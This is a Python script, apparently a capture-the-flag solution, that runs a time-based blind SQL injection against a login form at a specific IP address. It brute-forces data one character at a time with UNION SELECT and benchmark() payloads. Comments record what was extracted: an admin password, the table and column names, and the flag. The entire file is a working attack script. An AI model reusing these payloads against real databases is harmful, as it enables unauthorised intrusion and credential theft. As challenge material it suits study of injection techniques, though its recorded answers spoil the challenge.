from requests import post
from sys import stdout
#AD{601dc730bb9c5c531d3c8fa10b6ac69d}

PRINTABLE = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
URL = "http://140.115.59.13:9487/admin.php"

def q(query, i, c):
    s = "' and 1=2 union select 1, if(substring(({}),{},1) = {},"
    s += " benchmark(50000000,encode('fuck','by 5 seconds')),null) -- "
    return s.format(query, i, hex(ord(c)))

def bf(query):
    i = 0
    while True:
        for c in PRINTABLE:
            try:
                password = q(query, i, c)
                post(URL, data={"user": "", "password": password}, timeout=0.5)
            except KeyboardInterrupt:
                exit()
            except:
                stdout.write(c)
                stdout.flush()
                break
        i += 1

#bf("select password from users where user = 'admin'") # AD{bigheadnogg}
#bf("select database()") # adlctf
#bf("select count(user) from users") # 1
#bf("select count(table_name) from information_schema.tables") # 63
#bf("select count(table_name) from information_schema.tables where table_schema != 'information_schema'") # 2
#bf("select table_name from information_schema.tables where table_schema != 'information_schema' and table_name != 'users'") # flag
#bf("select column_name from information_schema.columns where table_name = 'flag'") # adl
#bf("select adl from flag") # AD{601dc730bb9c5c531d3c8fa10b6ac69d}
#bf("select count(table_name) from information_schema.tables")
bf("select table_name from information_schema.tables where table_schema != 'information_schema'")
